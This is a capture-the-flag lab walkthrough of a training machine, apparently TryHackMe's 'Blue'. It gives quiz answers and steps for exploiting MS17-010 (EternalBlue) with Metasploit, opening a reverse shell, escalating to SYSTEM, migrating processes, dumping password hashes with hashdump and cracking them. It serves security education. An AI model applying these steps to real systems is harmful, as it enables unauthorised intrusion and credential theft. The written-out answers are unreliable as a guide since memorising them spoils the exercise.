# Blue

> IP = 10.10.80.106

## TASK 1 - Recon

1. Deploy Machine

2. How many ports are open with a port number under 1000?
   1. ANSWER: `3`

3. What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
   1. ANSWER: `ms17-010`

## TASK 2 - Gain Access

1. Start Metasploit

2. Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
   1. ANSWER: `exploit/windows/smb/ms17_010_eternalblue`

3. Show options and set the one required value. What is the name of this value? (All caps for submission)
   1. ANSWER: `RHOSTS`

4. With that done, run the exploit!
   1. Before we run use this syntax: `set payload windows/x64/shell/reverse_tcp` for learning purposes

5. Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.

## TASK 3 - Escalate

1. If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)

2. Select this (use MODULE_PATH). Show options, what option are we required to change?

3. Set the required option, you may need to list all of the sessions to find your target here.

4. Run! If this doesn't work, try completing the exploit from the previous task once more.

5. Once the meterpreter shell conversion completes, select that session for use.

6. Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.

7. List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).

8. Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.

## TASK 4 - Cracking

1. Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?

2. Copy this password hash to a file and research how to crack it. What is the cracked password?

## TASK 5 - Find Flags

1. Flag1? This flag can be found at the system root.

2. Flag2? This flag can be found at the location where passwords are stored within Windows.

3. Flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.
